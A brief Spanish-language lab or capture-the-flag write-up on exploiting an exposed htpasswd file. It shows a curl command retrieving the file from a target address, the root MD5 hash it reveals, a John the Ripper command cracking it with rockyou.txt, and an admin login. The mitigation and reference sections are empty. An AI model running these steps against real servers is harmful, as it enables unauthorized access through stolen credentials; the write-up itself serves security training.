# Explotación archivo htpasswd


## Ataque
En el reconocimiento inicial, hemos visto que el servidor usa el fichero **robots.txt** para ocultar ciertos archivos o directorios de crawlers.


Nos centramos aquí en la carpeta **whatever**, en donde encontramos un archivo **htpasswd**, que es un archivo de credenciales para acceso por roles.

Obtenemos el archivo en local para ver su contenido.

```bash
curl http://192.168.13.47/whatever/htpaswd -o htpasswd -L && cat htpasswd

root:437394baff5aa33daa618be47b75cb49
```

Hemos obtenido un archivo con lo que parece ser credenciales para el usuario root, y el hash es sospechosamente parecido a un **MD5**.

Lanzamos un john para ver si podemos crackearlo.

```
./john --format=raw-md5 --wordlist=rockyou.txt ./htpasswd


```

Son credenciales de admin, pues nos intentamos loggear como admin.

## Mitigaciones

## Referencias